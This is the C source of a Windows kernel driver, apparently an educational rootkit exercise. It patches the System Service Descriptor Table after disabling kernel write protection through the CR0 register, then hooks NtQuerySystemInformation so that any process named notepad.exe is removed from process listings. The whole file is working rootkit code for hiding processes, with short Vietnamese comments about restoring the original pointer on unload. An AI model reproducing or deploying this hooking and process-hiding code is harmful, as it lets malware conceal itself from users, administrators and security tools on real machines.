#include <ntddk.h>

typedef struct _KSERVICE_DESCRIPTOR_TABLE
{
    PULONG ServiceTableBase;
    PULONG ServiceCounterTableBase;
    ULONG NumberOfServices;
    PUCHAR ParamTableBase;
}KSERVICE_DESCRIPTOR_TABLE, * PKSERVICE_DESCRIPTOR_TABLE;

typedef struct _SYSTEM_PROCESS_INFO
{
    ULONG                  NextEntryOffset;
    ULONG                  NumberOfThreads;
    LARGE_INTEGER          Reserved[3];
    LARGE_INTEGER          CreateTime;
    LARGE_INTEGER          UserTime;
    LARGE_INTEGER          KernelTime;
    UNICODE_STRING        ImageName;
    ULONG                  BasePriority;
    HANDLE                ProcessId;
    HANDLE                InheritedFromProcessId;
}SYSTEM_PROCESS_INFO, * PSYSTEM_PROCESS_INFO;

typedef NTSTATUS(*pNtQuerySystemInformation)(ULONG, PVOID, ULONG, PULONG);

extern PKSERVICE_DESCRIPTOR_TABLE KeServiceDescriptorTable;

NTSYSAPI NTSTATUS NTAPI ZwQuerySystemInformation(ULONG, PVOID, ULONG, PULONG);

pNtQuerySystemInformation fnNtQuerySystemInformation;

PVOID Hook(ULONG ServiceNumber, PVOID Hook)
{
    PVOID OrigAddress;

    OrigAddress = (PVOID)KeServiceDescriptorTable->ServiceTableBase[ServiceNumber];

    __asm
    {
        cli
        mov eax, cr0
        and eax, not 0x10000
        mov cr0, eax
    }

    KeServiceDescriptorTable->ServiceTableBase[ServiceNumber] = (ULONG)Hook;

    __asm
    {
        mov eax, cr0
        or eax, 0x10000
        mov cr0, eax
        sti
    }

    return OrigAddress;
}

NTSTATUS HookNtQuerySystemInformation(ULONG InfoClass, PVOID Buffer, ULONG Length, PULONG ReturnLength)
{
    PSYSTEM_PROCESS_INFO pCurr, pNext;
    NTSTATUS ret;

    if (InfoClass != 5)
    {
        return fnNtQuerySystemInformation(InfoClass, Buffer, Length, ReturnLength);
    }

    ret = fnNtQuerySystemInformation(InfoClass, Buffer, Length, ReturnLength);

    if (NT_SUCCESS(ret))
    {
        pCurr = NULL;
        pNext = Buffer;

        while (pNext->NextEntryOffset != 0)
        {
            pCurr = pNext;
            pNext = (PSYSTEM_PROCESS_INFO)((PUCHAR)pCurr + pCurr->NextEntryOffset);

            if (!wcscmp(L"notepad.exe", pNext->ImageName.Buffer))
            {
                if (pNext->NextEntryOffset == 0)
                {
                    pCurr->NextEntryOffset = 0;
                }

                else
                {
                    pCurr->NextEntryOffset += pNext->NextEntryOffset;
                }

                pNext = pCurr;
            }
        }
    }

    return ret;
}

void Unload(PDRIVER_OBJECT pDriverObject)
{
    DbgPrint("[SSDT] Unload routine called.\n");
    Hook(*(PULONG)((PUCHAR)ZwQuerySystemInformation + 1), fnNtQuerySystemInformation);// gan lai dia chi ham ban dau, neu k se co loi bsod
}

NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath)
{
    pDriverObject->DriverUnload = Unload;

    fnNtQuerySystemInformation = Hook(*(PULONG)((PUCHAR)ZwQuerySystemInformation + 1), HookNtQuerySystemInformation);// tra ve gia tri dia chi ham ban dau

    DbgPrint("[SSDT] NtQuerySystemInformation address: %#x\n", fnNtQuerySystemInformation);
    return STATUS_SUCCESS;
}